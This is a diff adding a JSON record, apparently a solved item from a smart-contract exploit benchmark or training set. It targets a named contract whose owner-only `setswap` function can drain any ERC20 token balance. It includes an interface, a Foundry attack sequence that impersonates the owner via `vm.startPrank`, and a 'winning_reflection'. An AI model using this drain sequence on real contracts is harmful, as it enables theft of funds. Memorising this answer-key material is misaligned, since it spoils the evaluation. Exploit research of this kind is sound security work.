@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "The `setswap` function in the target contract `0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70` is vulnerable to owner privilege abuse. It can only be called by the contract's owner, but its logic is flawed, allowing the owner to arbitrarily transfer the contract's entire balance of any specified ERC20 token to an arbitrary address.",
+  "interface_arsenal": "interface IMetaApes {\n    function getOwner() external view returns (address);\n    function setswap(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external;\n}",
+  "attack_sequence": "address owner = IMetaApes(TARGET).getOwner();\nvm.startPrank(owner);\nIMetaApes(TARGET).setswap(address(victimToken), attacker, 1, 1);\nvm.stopPrank();",
+  "winning_reflection": "The exploit's success hinges on identifying the privileged owner via a public `getOwner` function. By impersonating this owner, the attacker gains authorization to call the `setswap` function. This function was then misused to drain the contract's entire balance of a target token, demonstrating a critical flaw in its privileged logic."
+}
